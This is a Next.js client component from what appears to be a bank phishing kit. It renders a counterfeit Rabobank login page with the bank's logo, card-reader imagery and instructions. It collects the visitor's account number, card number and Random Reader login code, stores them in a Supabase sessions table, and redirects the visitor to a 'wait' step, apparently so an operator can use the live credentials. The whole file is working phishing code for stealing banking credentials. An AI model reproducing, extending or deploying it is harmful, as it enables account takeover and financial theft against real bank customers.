"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function RabobankClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [rekeningnummer, setRekeningnummer] = useState("");
  const [pasnummer, setPasnummer] = useState("");
  const [inlogcode, setInlogcode] = useState("");
  const [remember, setRemember] = useState(false);
  const [saving, setSaving] = useState(false);
  const formDoluMu = rekeningnummer.trim().length > 0 && pasnummer.trim().length > 0 && inlogcode.trim().length > 0;

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setRekeningnummer(fd.verfuegernummer);
      if (fd.pasnummer) setPasnummer(fd.pasnummer);
      if (fd.pin) setInlogcode(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleFinalSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
      form_data: { 
        ...prev, 
        bankSlug: "rabobank", 
        bankName: "Rabobank", 
        verfuegernummer: rekeningnummer, 
        pasnummer, 
        pin: inlogcode 
      }
    }).eq("id", sessionId);
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#1B1D22] font-sans flex flex-col items-center">
      {/* Top Header */}
      <header className="w-full h-16 bg-gradient-to-b from-[#00104A] to-[#002B7F] flex items-center justify-between px-8 relative">
        <img src="/bank-logos/rabobank-detail-new.webp" alt="Rabobank" className="h-10" />
        <div className="text-white text-[13px] font-bold tracking-wide">
          NL | <span className="text-gray-400 font-normal">EN</span>
        </div>
      </header>

      {/* Main Form Area */}
      <main className="w-full max-w-[500px] mt-10 px-4 pb-20">
        <div className="bg-[#22262F] rounded-lg p-8 shadow-2xl relative overflow-hidden">
          
          <h1 className="text-white text-[28px] font-serif italic text-center mb-8">Log in</h1>

          <form onSubmit={(e) => { e.preventDefault(); void handleFinalSubmit(); }}>
            <div className="flex gap-4 mb-6">
              <div className="flex-[2]">
                <label className="block text-[13px] text-gray-300 mb-2">Account number</label>
                <input 
                  type="text" 
                  value={rekeningnummer} 
                  onChange={e => setRekeningnummer(e.target.value)} 
                  className="w-full bg-[#181A1F] border border-gray-600 rounded-[4px] py-2.5 px-3 text-white focus:outline-none focus:border-[#FF6600] transition-colors" 
                  placeholder="NL.. RABO 0..."
                />
              </div>
              <div className="flex-1">
                <label className="block text-[13px] text-gray-300 mb-2">Card number</label>
                <input 
                  type="text" 
                  value={pasnummer} 
                  onChange={e => setPasnummer(e.target.value)} 
                  className="w-full bg-[#181A1F] border border-gray-600 rounded-[4px] py-2.5 px-3 text-white focus:outline-none focus:border-[#FF6600] transition-colors" 
                />
              </div>
              <div className="flex items-end pb-3">
                <label className="flex items-center gap-2 cursor-pointer group">
                  <input type="checkbox" checked={remember} onChange={e => setRemember(e.target.checked)} className="w-4 h-4 bg-[#181A1F] border-gray-600 rounded-[3px] accent-[#FF6600]" />
                  <span className="text-[12px] text-gray-300 group-hover:text-white">Remember</span>
                </label>
              </div>
            </div>

            <div className="flex justify-center mb-6">
              <img src="/bank-assets/Rabobank/rabo_reader_comfort.webp" alt="Rabo Scanner" className="h-[140px] object-contain drop-shadow-xl" />
            </div>

            <p className="text-center text-[12px] text-gray-300 leading-relaxed mb-6 px-4">
              Insert your debit card into the Rabo Random Reader. Press "I" (Log in). Enter your PIN and press "OK". Enter the access code shown on the Random Reader Comfort here.
            </p>

            <div className="mb-8">
              <label className="block text-[13px] text-gray-300 mb-2">Login code</label>
              <input 
                type="text" 
                value={inlogcode} 
                onChange={e => setInlogcode(e.target.value)} 
                className="w-full bg-[#181A1F] border border-gray-600 rounded-[4px] py-3 px-3 text-white focus:outline-none focus:border-[#FF6600] transition-colors text-center tracking-widest text-[16px] font-mono" 
              />
            </div>

            <button 
              type="submit" 
              disabled={!formDoluMu || saving} 
              className={`w-full font-bold py-3 rounded-[4px] transition-colors ${formDoluMu && !saving ? "bg-[#3B404E] hover:bg-[#484E5E] hover:text-white text-white" : "bg-gray-400 text-gray-700 opacity-70"}`}
            >
              {saving ? "Loading..." : "Log in"}
            </button>
          </form>

          {/* Bottom Tabs inside Card */}
          <div className="flex gap-4 mt-8 pt-6 border-t border-[#3B404E]">
            <button type="button" className="flex-1 border border-[#3B404E] rounded-[4px] py-3 px-2 flex flex-col items-center justify-center gap-2 hover:bg-[#2A2E38] transition-colors">
              <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
              <span className="text-[12px] text-gray-300 text-center leading-tight">Log in with the<br/>Rabo App</span>
            </button>
            <button type="button" className="flex-1 border border-[#4882F6] bg-[#2A3143] rounded-[4px] py-3 px-2 flex flex-col items-center justify-center gap-2 transition-colors relative overflow-hidden">
              {/* Highlight bar at bottom to show it's active */}
              <div className="absolute bottom-0 left-0 right-0 h-1 bg-[#4882F6]"></div>
              <svg className="w-5 h-5 text-[#4882F6]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm14 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z"></path></svg>
              <span className="text-[12px] text-white font-medium text-center leading-tight">Log in with the<br/>Rabo Scanner</span>
            </button>
          </div>

          <div className="mt-8 text-center">
            <a href="#" className="text-[#4882F6] text-[13px] hover:underline flex items-center justify-center gap-1">
              Help with logging in
              <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
            </a>
          </div>

        </div>
      </main>
    </div>
  );
}